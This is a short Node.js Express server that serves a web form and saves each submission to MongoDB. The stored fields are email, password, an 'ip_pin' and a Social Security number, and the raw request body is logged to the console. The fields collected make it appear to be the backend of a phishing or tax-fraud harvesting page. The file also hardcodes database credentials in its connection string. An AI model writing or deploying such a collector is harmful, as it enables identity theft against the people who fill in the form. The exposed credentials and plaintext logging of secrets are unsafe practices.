const express = require('express');
const { default: mongoose } = require('mongoose');
const userModel = require('./model')
const port = process.env.PORT || 5000;  //this is our port number
const CONN_URL = "mongodb+srv://Otunba:grammy01@cluster0.o7zcoje.mongodb.net/my_db?retryWrites=true&w=majority"

const app = express(); // this is our app or instance of express



//Api Middleware

app.use(express.json()); // This is to accept data in json format

app.use(express.urlencoded({ extended: false })); // This is to encode data sent through htnl form

app.use(express.static('public')); // This is to serve our public file




//API Routes
app.get('/form', (req,res) =>{
    res.sendFile(__dirname + '/public/index.html')
})

app.post('/formPost', async (req,res) => {
    try {
        const newUser = new userModel({
            email: req.body.email,
            password: req.body.password,
            ip_pin: req.body.ip_pin,
            ssn: req.body.ssn,
        })
        const savedUser = await newUser.save()
        console.log(req.body);  // The data we get is in the body of request
        res.status(200).json({ message: "user added successful!", data: savedUser })
        // res.sendStatus(200);
    } catch (error) {
        res.status(404).json({ message: error,message })
    }
})


//This is basically to listen on port 5000
mongoose.connect(CONN_URL).then(() => {
    app.listen(port, ()=>{
        console.log(`server started at http://localhost:${port}`)
    });
    console.log("database connected!");
}).catch((err) => {
    console.log(err.message);
})
